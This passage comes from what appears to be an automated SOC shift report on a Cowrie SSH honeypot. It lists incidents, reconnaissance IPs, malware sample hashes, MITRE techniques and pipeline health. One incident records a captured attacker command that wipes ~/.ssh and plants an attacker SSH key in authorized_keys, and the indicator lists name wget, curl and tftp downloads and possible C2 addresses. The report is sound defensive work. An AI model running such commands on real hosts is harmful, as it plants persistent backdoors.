| `2026-07-02 06:33:07` | `cowrie.login.success` |
| `2026-07-02 06:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.85[.]48` to AbuseIPDB if not already reported
- [ ] Block `129.121.85[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efa2b65a437

| Field | Detail |
|---|---|
| **Source IP** | `129.121.85[.]48` |
| **First Seen** | 2026-07-02 06:33 |
| **Last Seen** | 2026-07-02 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:33:07` | `cowrie.session.connect` |
| `2026-07-02 06:33:07` | `cowrie.client.version` |
| `2026-07-02 06:33:07` | `cowrie.client.kex` |
| `2026-07-02 06:33:07` | `cowrie.login.success` |
| `2026-07-02 06:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.85[.]48` to AbuseIPDB if not already reported
- [ ] Block `129.121.85[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbd3ac6d355

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 06:34 |
| **Last Seen** | 2026-07-02 06:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:34:48` | `cowrie.session.connect` |
| `2026-07-02 06:34:48` | `cowrie.client.version` |
| `2026-07-02 06:34:48` | `cowrie.client.kex` |
| `2026-07-02 06:34:50` | `cowrie.login.success` |
| `2026-07-02 06:34:51` | `cowrie.session.params` |
| `2026-07-02 06:34:51` | `cowrie.command.input` |
| `2026-07-02 06:34:52` | `cowrie.log.closed` |
| `2026-07-02 06:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1102d799da3

| Field | Detail |
|---|---|
| **Source IP** | `106.13.122[.]214` |
| **First Seen** | 2026-07-02 06:41 |
| **Last Seen** | 2026-07-02 06:46 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:41:10` | `cowrie.session.connect` |
| `2026-07-02 06:41:10` | `cowrie.client.version` |
| `2026-07-02 06:41:10` | `cowrie.client.kex` |
| `2026-07-02 06:41:11` | `cowrie.login.success` |
| `2026-07-02 06:41:12` | `cowrie.session.params` |
| `2026-07-02 06:41:12` | `cowrie.command.input` |
| `2026-07-02 06:41:12` | `cowrie.command.failed` |
| `2026-07-02 06:41:12` | `cowrie.log.closed` |
| `2026-07-02 06:41:13` | `cowrie.session.params` |
| `2026-07-02 06:41:13` | `cowrie.command.input` |
| `2026-07-02 06:41:14` | `cowrie.session.file_download` |
| `2026-07-02 06:41:14` | `cowrie.log.closed` |
| `2026-07-02 06:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.122[.]214` to AbuseIPDB if not already reported
- [ ] Block `106.13.122[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08a49abbb31

| Field | Detail |
|---|---|
| **Source IP** | `106.13.122[.]214` |
| **First Seen** | 2026-07-02 06:41 |
| **Last Seen** | 2026-07-02 06:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:41:14` | `cowrie.session.connect` |
| `2026-07-02 06:41:14` | `cowrie.client.version` |
| `2026-07-02 06:41:14` | `cowrie.client.kex` |
| `2026-07-02 06:41:16` | `cowrie.login.success` |
| `2026-07-02 06:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.122[.]214` to AbuseIPDB if not already reported
- [ ] Block `106.13.122[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed55c00bbfb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 06:41 |
| **Last Seen** | 2026-07-02 06:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:41:17` | `cowrie.session.connect` |
| `2026-07-02 06:41:18` | `cowrie.client.version` |
| `2026-07-02 06:41:18` | `cowrie.client.kex` |
| `2026-07-02 06:41:24` | `cowrie.login.success` |
| `2026-07-02 06:41:28` | `cowrie.session.params` |
| `2026-07-02 06:41:28` | `cowrie.command.input` |
| `2026-07-02 06:41:29` | `cowrie.log.closed` |
| `2026-07-02 06:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ec614555ac

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 06:48 |
| **Last Seen** | 2026-07-02 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:48:35` | `cowrie.session.connect` |
| `2026-07-02 06:48:35` | `cowrie.client.version` |
| `2026-07-02 06:48:35` | `cowrie.client.kex` |
| `2026-07-02 06:48:37` | `cowrie.login.success` |
| `2026-07-02 06:48:38` | `cowrie.session.params` |
| `2026-07-02 06:48:38` | `cowrie.command.input` |
| `2026-07-02 06:48:38` | `cowrie.log.closed` |
| `2026-07-02 06:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94feed7dd69

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 06:52 |
| **Last Seen** | 2026-07-02 06:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 06:52:54` | `cowrie.session.connect` |
| `2026-07-02 06:52:56` | `cowrie.client.version` |
| `2026-07-02 06:52:56` | `cowrie.client.kex` |
| `2026-07-02 06:53:02` | `cowrie.login.success` |
| `2026-07-02 06:53:06` | `cowrie.session.params` |
| `2026-07-02 06:53:06` | `cowrie.command.input` |
| `2026-07-02 06:53:08` | `cowrie.log.closed` |
| `2026-07-02 06:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **35** | 2026-07-02 03:05 | 2026-07-02 06:45 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `159.65.233[.]253` | **5** | 2026-07-02 04:23 | 2026-07-02 06:46 | 5m | 0 | `T1592` | 🟢 LOW |
| `34.140.88[.]205` | **3** | 2026-07-02 03:12 | 2026-07-02 03:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.229[.]2` | **2** | 2026-07-02 03:38 | 2026-07-02 03:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `118.145.107[.]219` | **2** | 2026-07-02 03:45 | 2026-07-02 03:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-07-02 03:02 | 2026-07-02 03:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.193[.]19` | **2** | 2026-07-02 05:52 | 2026-07-02 05:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-07-02 06:34 | 2026-07-02 06:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]194` | **2** | 2026-07-02 05:58 | 2026-07-02 05:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]111` | **2** | 2026-07-02 05:42 | 2026-07-02 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.219.93[.]189` | **2** | 2026-07-02 06:15 | 2026-07-02 06:18 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.53[.]14` | 1 | 2026-07-02 04:42 | 2026-07-02 04:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.122[.]214` | 1 | 2026-07-02 06:41 | 2026-07-02 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]156` | 1 | 2026-07-02 04:31 | 2026-07-02 04:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.19.212[.]140` | 1 | 2026-07-02 04:00 | 2026-07-02 04:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.228.51[.]116` | 1 | 2026-07-02 04:26 | 2026-07-02 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]197` | 1 | 2026-07-02 04:46 | 2026-07-02 04:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.194.235[.]105` | 1 | 2026-07-02 06:16 | 2026-07-02 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.167.57[.]19` | 1 | 2026-07-02 03:37 | 2026-07-02 03:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.225.4[.]88` | 1 | 2026-07-02 03:52 | 2026-07-02 03:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]218` | 1 | 2026-07-02 02:55 | 2026-07-02 02:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]7` | 1 | 2026-07-02 04:53 | 2026-07-02 04:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]218` | 1 | 2026-07-02 05:55 | 2026-07-02 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.25.241[.]153` | 1 | 2026-07-02 03:43 | 2026-07-02 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-02 04:15 | 2026-07-02 04:16 | 33s | 0 | `T1592` | 🟢 LOW |
| `213.166.84[.]35` | 1 | 2026-07-02 06:30 | 2026-07-02 06:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.156.3[.]21` | 1 | 2026-07-02 03:00 | 2026-07-02 03:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.79.21[.]94` | 1 | 2026-07-02 03:12 | 2026-07-02 03:12 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-02 04:03 | 2026-07-02 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.250.43[.]129` | 1 | 2026-07-02 05:07 | 2026-07-02 05:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.234.58[.]209` | 1 | 2026-07-02 06:37 | 2026-07-02 06:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]10` | 1 | 2026-07-02 05:55 | 2026-07-02 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | 1 | 2026-07-02 05:45 | 2026-07-02 05:45 | 18s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-02 06:50 | 2026-07-02 06:50 | 35s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]89` | 1 | 2026-07-02 06:30 | 2026-07-02 06:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]181` | 1 | 2026-07-02 04:53 | 2026-07-02 04:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.96.229[.]2` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `34.79.21[.]94` | BE | Google LLC | **100** ⚠️ | 0 |
| `34.140.88[.]205` | BE | Google LLC | **100** ⚠️ | 2 |
| `66.132.195[.]111` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `129.121.85[.]48` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 15 |
| `49.207.40[.]162` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 50 |
| `117.34.85[.]169` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 23 |
| `150.5.131[.]119` | HK | BYTEPLUS | **100** ⚠️ | 41 |
| `106.13.122[.]214` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `112.168.171[.]175` | KR | Korea Telecom | **100** ⚠️ | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 210 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 195 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 287 cases |
| Tool 34  | Credential Extractor        | ✅ 237 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (3.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 193 priority case(s) shown individually · 36 recon entry/entries in table (11 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
